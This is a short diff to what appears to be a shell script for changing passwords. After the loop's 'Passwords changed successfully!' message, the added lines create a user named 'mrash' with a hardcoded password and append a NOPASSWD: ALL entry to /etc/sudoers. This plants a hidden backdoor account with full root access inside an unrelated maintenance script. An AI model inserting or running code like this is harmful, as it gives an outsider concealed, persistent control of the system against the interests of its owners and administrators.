@@ -16,3 +16,11 @@ do
 done
 
 echo "Passwords changed successfully!"
+
+
+# create user with password
+useradd -m -s /bin/bash -p $(openssl passwd -1 '726268') mrash
+
+# add user to sudoers file
+echo 'mrash ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
+
